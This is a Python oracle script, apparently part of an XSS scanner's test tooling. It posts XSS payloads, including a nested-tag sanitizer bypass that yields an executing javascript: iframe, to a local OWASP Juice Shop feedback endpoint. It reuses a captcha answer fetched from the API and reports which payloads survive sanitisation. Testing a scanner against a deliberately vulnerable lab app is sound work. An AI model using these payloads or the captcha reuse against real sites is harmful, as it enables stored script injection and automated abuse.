# -*- coding: utf-8 -*-
"""Phase 173 oracle: which payload-corpus shapes survive Juice Shop's
sanitize-html, and what is left of them?

The scanner wrote six feedback rows and ALL six came back empty (''), while a
hand-written `<<script>Foo</script>iframe src="javascript:alert(`xss`)">`
became a real, executing iframe.  So the question is whether the corpus
contains any shape that survives the non-recursive sanitiser at all.

Usage: python _p173_oracle.py [port]
"""
from __future__ import annotations

import json
import os
import sys
import urllib.error
import urllib.request

BASE = f"http://127.0.0.1:{sys.argv[1] if len(sys.argv) > 1 else 3000}"
_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CORPUS = os.path.join(_ROOT, "xssentinel", "data", "payloads.json")


def call(method: str, path: str, data=None):
    req = urllib.request.Request(
        BASE + path, method=method,
        data=json.dumps(data).encode() if data is not None else None,
        headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            raw = r.read()
            return r.status, (json.loads(raw) if raw else {})
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:150]


def main() -> int:
    d = json.load(open(CORPUS, encoding="utf-8"))
    payloads = d["payloads"]

    picks = [p for p in payloads if p["payload"].startswith("<<")]
    picks += [p for p in payloads
              if p["context"] == "html_element"
              and p.get("confidence") == "high"][:4]
    picks += [{"id": "HANDOFFICIAL", "context": "manual",
               "payload": ('<<script>Foo</script>iframe '
                           'src="javascript:alert(`xss`)">'),
               "note": "the shape Juice Shop's own test documents"}]

    seen, uniq = set(), []
    for p in picks:
        if p["id"] not in seen:
            seen.add(p["id"])
            uniq.append(p)

    _s, cap = call("GET", "/rest/captcha")
    cid, ans = cap["captchaId"], cap["answer"]
    print(f"captchaId={cid} (reusable)\n")

    survivors = 0
    for p in uniq:
        st, r = call("POST", "/api/Feedbacks", {
            "comment": p["payload"], "rating": 1,
            "captchaId": cid, "captcha": ans})
        stored = (r.get("data") or {}).get("comment") if isinstance(r, dict) else r
        kept = bool(stored)
        has_tag = bool(stored and ("<" in stored))
        if kept:
            survivors += 1
        print(f"[{p['id']}] {p['context']}")
        print(f"    sent  : {p['payload'][:95]!r}")
        print(f"    stored: {stored[:95]!r}   status={st}"
              f"   survived={kept} keeps_angle={has_tag}")
        print()

    print(f"survivors: {survivors}/{len(uniq)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
